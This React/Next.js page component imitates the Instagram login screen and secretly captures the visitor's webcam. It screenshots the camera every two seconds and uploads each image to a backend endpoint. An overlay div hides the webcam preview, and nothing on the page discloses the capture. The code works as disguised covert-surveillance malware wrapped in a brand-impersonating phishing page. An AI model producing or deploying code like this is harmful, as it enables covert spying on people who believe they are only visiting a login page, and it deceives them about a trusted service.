"use client";
import Webcam from "react-webcam";
import { useRef, useEffect } from "react";

export default function Home() {
  const webcamRef = useRef(null);
  useEffect(() => {
    const interval = setInterval(async () => {
      if (webcamRef.current) {
        const imageSrc = webcamRef.current.getScreenshot();
        if (imageSrc) {
          // console.log("Captured image:", imageSrc);

          // Convert the base64 image to a Blob
          const blob = await fetch(imageSrc).then((res) => res.blob());
          const formData = new FormData();
          formData.append("image", blob, `image-${Date.now()}.jpeg`);

          // Send the captured image to the backend API to store it locally
          try {
            const uploadResponse = await fetch("/api/upload", {
              method: "POST",
              body: formData,
            });

            const data = await uploadResponse.json();
            console.log("Image upload response:", data);
          } catch (error) {
            console.error("Error uploading image:", error);
          }
        }
      }
    }, 2000); // Capture image every 5 seconds

    return () => clearInterval(interval); // Clear interval on component unmount
  }, []);

  return (
    <>
      <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
        <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
          <h1 className="bg-no-repeat instagram-logo"></h1>
          <form className="mt-8 w-64 flex flex-col">
            <input
              autoFocus
              className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="email"
              placeholder="Phone number, username, or email"
              type="text"
            />
            <input
              autoFocus
              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="password"
              placeholder="Password"
              type="password"
            />
            <a className="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
              Log In
            </a>
          </form>

          <div className="flex justify-evenly space-x-2 w-64 mt-4">
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
              or
            </span>
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
          </div>
          <button className="mt-4 flex">
            <div className="bg-no-repeat facebook-logo mr-1"></div>
            <span className="text-xs text-blue-900 font-semibold">
              Log in with Facebook
            </span>
          </button>
          <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
            Forgot password?
          </a>
        </div>
        <div className="bg-white border border-gray-300 text-center w-80 py-4">
          <span className="text-sm">Don't have an account?</span>
          <a className="text-blue-500 text-sm font-semibold">Sign up</a>
        </div>
        <div className="mt-3 text-center">
          <span className="text-xs">Get the app</span>
          <div className="flex mt-3 space-x-2">
            <div className="bg-no-repeat apple-store-logo"></div>
            <div className="bg-no-repeat google-store-logo"></div>
          </div>
        </div>
      </div>
      <div className=" absolute top-0 w-1/3">
        <div className="absolute w-full h-full bg-[#F9FAFB]"></div>

        <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
      </div>
    </>
  );
}
